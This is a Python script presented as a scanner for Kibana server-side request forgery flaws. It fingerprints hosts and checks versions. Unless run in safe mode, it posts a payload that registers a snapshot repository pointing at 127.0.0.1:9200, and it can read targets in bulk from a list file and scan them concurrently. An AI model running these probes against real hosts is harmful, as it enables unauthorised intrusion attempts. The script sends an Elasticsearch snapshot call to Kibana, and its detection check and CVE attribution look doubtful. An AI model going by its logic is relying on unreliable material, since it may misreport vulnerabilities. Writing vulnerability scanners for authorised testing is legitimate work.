#!/usr/bin/env python3
"""
Kibana SSRF Vulnerability Scanner
=================================
This tool detects potential Server-Side Request Forgery (SSRF) vulnerabilities in Kibana APIs, 
which can allow attackers to send unauthorized requests from the Kibana server to internal 
services, leading to sensitive information disclosure or other exploit chains.

SSRF vulnerabilities in Kibana have been identified in multiple CVEs, such as CVE-2021-22137. 
These stem from misconfigurations or unsafe API functionality, which attackers can exploit 
through crafted requests.

Key Features:
  - Detects common Kibana fingerprints to identify potential targets.
  - Extracts and validates the Kibana version to determine its vulnerability.
  - Probes for known SSRF issues while optionally running in `--safe` mode for non-intrusive scans.
  - Provides JSON output for integration into larger security toolchains.

Requirements:
  - `httpx` (for asynchronous HTTP requests).
  - Python 3.10+ required.

Usage:
  # Scan a single target
  python kibana_ssrf_scanner.py --target https://kibana.example.com

  # Scan a list of targets defined in a file
  python kibana_ssrf_scanner.py --list targets.txt --output findings.json

  # Safe mode (detection only, no SSRF probing)
  python kibana_ssrf_scanner.py --list targets.txt --safe

  # Set custom concurrency level
  python kibana_ssrf_scanner.py --list targets.txt --concurrency 50

References:
- CVE-2021-22137: https://nvd.nist.gov/vuln/detail/CVE-2021-22137
- https://github.com/elastic/kibana
- https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
"""

import asyncio
import argparse
import httpx
import json
import re
import sys
from urllib.parse import urljoin

# Constants
KIBANA_FINGERPRINTS = [
    "<title>Kibana</title>",
    "window.__KBN_DASHBOARD_APP_ID__",
]
SSRF_ENDPOINTS = [
    "_snapshot",
    "api/saved_objects/_find",
]
VULN_FIXED_VERSIONS = {
    "7.12.0": (7, 12, 0),
}
SSRF_PAYLOAD = {"repository": {"type": "url", "settings": {"url": "http://127.0.0.1:9200"}}}
REQUEST_TIMEOUT = 8
SEMAPHORE_LIMIT = 30

# ANSI Color codes
RED = "\033[31m"
YELLOW = "\033[33m"
GREEN = "\033[32m"
RESET = "\033[0m"

# Helper Functions
def parse_version(version_string):
    """Parses a version string into a tuple (major, minor, patch)."""
    try:
        return tuple(map(int, version_string.split(".")))
    except Exception:
        return None

def is_vulnerable(version_string):
    """Checks if the provided Kibana version is vulnerable."""
    parsed_version = parse_version(version_string)
    if not parsed_version:
        return None
    for fixed_version, fixed_tuple in VULN_FIXED_VERSIONS.items():
        if parsed_version < fixed_tuple:
            return True
    return False

def normalize_url(url):
    """Normalizes a URL to ensure it has a scheme and no trailing slash."""
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")

# Core Scanner Functions
async def detect_kibana(client, base_url, semaphore):
    """Checks if the target is running Kibana."""
    async with semaphore:
        try:
            response = await client.get(base_url, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                for fingerprint in KIBANA_FINGERPRINTS:
                    if fingerprint in response.text:
                        return True
        except Exception:
            pass
    return False

async def extract_version(client, base_url, semaphore):
    """Extracts the Kibana version from the target."""
    async with semaphore:
        try:
            response = await client.get(f"{base_url}/api/status", timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                data = response.json()
                return data.get("version", {}).get("number")
        except Exception:
            pass
    return None

async def check_ssrf(client, base_url, endpoint, semaphore):
    """
    Checks for SSRF vulnerability in a specific Kibana API endpoint.

    Returns:
        Boolean indicating if SSRF is exploitable.
    """
    async with semaphore:
        try:
            response = await client.post(
                urljoin(base_url, endpoint),
                json=SSRF_PAYLOAD,
                timeout=REQUEST_TIMEOUT,
            )
            if response.status_code in [200, 201] and "snapshot_repository" in response.text.lower():
                return True
        except Exception:
            pass
    return False

async def scan_target(client, base_url, semaphore, safe=False):
    """Scans a single target for Kibana SSRF vulnerabilities."""
    results = {"url": base_url, "is_kibana": False, "is_vulnerable_version": None, "ssrf_vulnerable": None}
    base_url = normalize_url(base_url)
    is_kibana = await detect_kibana(client, base_url, semaphore)

    if is_kibana:
        print(f"{YELLOW}[INFO]{RESET} Detected Kibana at {base_url}")
        results["is_kibana"] = True

        version = await extract_version(client, base_url, semaphore)
        if version:
            results["version"] = version
            vulnerable = is_vulnerable(version)
            results["is_vulnerable_version"] = vulnerable
            if vulnerable:
                print(f"{RED}[CRITICAL]{RESET} Vulnerable Kibana version detected: {version}")
            else:
                print(f"{GREEN}[INFO]{RESET} Patched Kibana version detected: {version}")
        else:
            print(f"{YELLOW}[INFO]{RESET} Unable to determine Kibana version.")

        if not safe and results["is_vulnerable_version"]:
            for endpoint in SSRF_ENDPOINTS:
                ssrf_vulnerable = await check_ssrf(client, base_url, endpoint, semaphore)
                if ssrf_vulnerable:
                    results["ssrf_vulnerable"] = True
                    print(f"{RED}[CRITICAL]{RESET} SSRF vulnerability detected in endpoint: {endpoint}")
                    break
            else:
                results["ssrf_vulnerable"] = False
    else:
        print(f"{GREEN}[INFO]{RESET} {base_url} does not appear to be a Kibana instance.")

    return results

async def main(targets, output=None, safe=False, concurrency=SEMAPHORE_LIMIT):
    semaphore = asyncio.Semaphore(concurrency)
    async with httpx.AsyncClient(follow_redirects=True) as client:
        scan_tasks = [scan_target(client, target, semaphore, safe) for target in targets]
        results = await asyncio.gather(*scan_tasks)

    # Write results to a JSON file if specified
    if output:
        with open(output, "w") as f:
            json.dump(results, f, indent=2)

    return results

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Kibana SSRF Vulnerability Scanner")
    parser.add_argument("--target", help="Target URL of the Kibana instance.")
    parser.add_argument("--list", help="File containing list of target URLs.")
    parser.add_argument("--output", help="File to save scan results in JSON format.")
    parser.add_argument("--safe", action="store_true", help="Run in detection-only mode without probing.")
    parser.add_argument("--concurrency", type=int, default=30, help="Number of concurrent connections.")
    args = parser.parse_args()

    if not args.target and not args.list:
        print(f"{RED}[ERROR] Either --target or --list must be specified.{RESET}")
        sys.exit(1)

    targets = []
    if args.target:
        targets.append(args.target)
    if args.list:
        try:
            with open(args.list, "r") as f:
                targets.extend(line.strip() for line in f if line.strip())
        except FileNotFoundError:
            print(f"{RED}[ERROR] Could not read targets from {args.list}{RESET}")
            sys.exit(1)

    # Run the scanner
    results = asyncio.run(main(targets, output=args.output, safe=args.safe, concurrency=args.concurrency))
    print(json.dumps(results, indent=2))
